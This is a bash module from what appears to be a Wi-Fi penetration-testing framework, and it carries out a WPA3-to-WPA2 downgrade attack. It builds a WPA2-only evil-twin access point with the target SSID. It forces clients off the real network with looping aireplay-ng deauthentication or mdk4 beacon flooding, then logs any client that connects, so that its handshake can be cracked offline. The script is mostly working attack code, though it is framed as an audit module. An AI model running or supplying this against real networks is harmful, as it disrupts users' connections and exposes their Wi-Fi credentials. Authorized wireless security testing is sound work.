#!/usr/bin/env bash
# MODULE_META
# NAME="WPA3-to-WPA2 Active Downgrade"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,mdk4,aireplay-ng"
# DESC="Attempt to force WPA3-SAE clients to downgrade to WPA2-PSK"
# REQS="monitor_iface,target_ssid,nat"
# PCAP="yes"
# DECODE="wpa3"

#===============================================================================
#  modules/d7_wpa3_downgrade_active.sh
#  D7: WPA3-to-WPA2 Active Downgrade (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Deploy a WPA2-only Evil Twin with the target SSID.
#  2. Interactive selection: Force roaming via Deauth or CSA (mdk4).
#  3. Capture the downgraded client's WPA2 handshake.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
    echo "[*] CSA/Deauth roams are highly unlikely to succeed at this distance."
    stty sane
    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET} ")" snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-11}" # Default to 11 if not set
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D7"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_downgrade"

if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_SSID not set."
    exit 1
fi

echo "[*] Initializing WPA3 Downgrade tactical options..."

# 1. Interactive Selection
echo "[?] Select Roaming Catalyst:"
echo "    1) Targeted Deauth (Surgical - Disrupts PMF)"
echo "    2) CSA (Channel Switch Announcement via mdk4 - Stealthier)"
stty sane
read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET} ")" catalyst_choice

# 2. Deploy WPA2-only Evil Twin
echo "[*] Deploying WPA2-PSK Evil Twin for SSID: $SSID..."
HOSTAPD_CONF="${EVIDENCE_DIR}/${TC_ID}_hostapd.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=DowngradeTest123
EOF

cleanup() {
    echo "[*] Cleaning up Downgrade processes..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
}
trap cleanup EXIT

hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!

# 3. Execution of Catalyst
if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
    # Continuous deauth to prevent client from staying on WPA3 AP
    (
        while kill -0 $HOSTAPD_PID 2>/dev/null; do
            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
            sleep 15
        done
    ) &
    CATALYST_PID=$!
elif [[ "$catalyst_choice" == "2" ]]; then
    if command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
        CATALYST_PID=$!
    fi
fi

echo "[*] Downgrade environment active. Monitoring for client association..."
# In a real test, we would also run airodump-ng in background to capture the WPA2 handshake
# as the client connects to our rogue AP using the known dummy passphrase.

sleep 60

# 4. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo "[!] SUCCESS: WPA3 CLIENT DOWNGRADED TO WPA2!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA3 Downgrade Successful" \
        --severity HIGH \
        --desc "A WPA3-capable client ($V_MAC) successfully associated with the WPA2 Evil Twin AP." \
        --target "$V_MAC" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "WPA3 transition mode vulnerability allows an attacker to force clients into a weaker WPA2-PSK handshake which can then be captured and cracked offline."
else
    echo "[+] Downgrade test complete. No client fallback detected."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[D7] Audit Complete" \
        --severity INFO \
        --desc "Attempted protocol downgrade attack on $SSID. No clients associated with the legacy AP." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Modern OSes may resist protocol downgrades if they have previously associated with the SSID using SAE (WPA3) and have cached that state."
fi

exit 0
